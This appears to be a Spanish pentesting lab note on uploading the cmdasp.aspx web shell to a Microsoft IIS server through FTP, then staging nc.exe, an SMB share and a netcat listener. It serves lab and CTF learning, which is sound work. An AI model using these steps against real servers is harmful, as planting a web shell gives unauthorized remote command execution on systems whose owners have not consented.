# Web Shell ASPX en Microsoft IIS

> **Escenario típico:** `FTP (21/TCP)` + `HTTP (80/TCP)`

En algunos laboratorios de pentesting, el servicio **FTP** está configurado para publicar directamente los archivos en el directorio web de **Microsoft IIS**. Si el servidor permite subir archivos `.aspx` y posteriormente ejecutarlos desde el navegador, puede obtenerse una **web shell** para interactuar con el sistema.

---

# Localizar una Web Shell ASPX

Kali Linux suele incluir la web shell `cmdasp.aspx`.

Buscar su ubicación:

```bash
find / -name cmdasp.aspx 2>/dev/null
```

Copiar el archivo al directorio de trabajo:

```bash
cp <ruta/cmdasp.aspx> .
```

---

# Subir la Web Shell mediante FTP

Conectarse al servicio FTP y subir el archivo:

```text
put cmdasp.aspx
```

Si el directorio FTP coincide con el directorio web del servidor, el archivo será accesible desde el navegador.

---

# Acceder a la Web Shell

Abrir el navegador y acceder a:

```text
http://<IP>/cmdasp.aspx
```

Si la subida ha sido correcta y el servidor permite ejecutar archivos ASPX, aparecerá una interfaz para ejecutar comandos del sistema.

---

# Herramientas útiles

## Localizar Netcat para Windows

En Kali Linux:

```bash
find / -name nc.exe 2>/dev/null
```

Copiar el binario al directorio actual:

```bash
cp <ruta/nc.exe> .
```

---

## Levantar un recurso compartido SMB

Compartir el directorio actual mediante Impacket:

```bash
impacket-smbserver recurso $(pwd) -smb2support
```

---

## Preparar un listener

```bash
nc -nlvp 443
```

---

# Flujo habitual en un laboratorio

1. Detectar un servidor IIS.
2. Comprobar si el servicio FTP publica directamente en el directorio web.
3. Subir una web shell ASPX.
4. Verificar que el archivo puede ejecutarse desde el navegador.
5. Utilizar la web shell para validar el nivel de acceso obtenido y continuar con las pruebas autorizadas según el escenario del laboratorio.

---

# Herramientas relacionadas

| Herramienta          | Descripción                                             |
| -------------------- | ------------------------------------------------------- |
| `cmdasp.aspx`        | Web shell ASPX utilizada habitualmente en laboratorios. |
| `ftp`                | Cliente para subir archivos al servidor FTP.            |
| `impacket-smbserver` | Comparte archivos mediante SMB.                         |
| `nc` (Netcat)        | Listener para pruebas de conectividad.                  |
| `find`               | Localiza archivos dentro del sistema.                   |

---

> **Nota:** Este escenario es frecuente en plataformas de aprendizaje como Hack The Box, TryHackMe o laboratorios de certificación, donde el servicio FTP publica directamente el contenido servido por IIS. En entornos reales esta configuración es poco habitual y suele estar restringida mediante controles de seguridad.
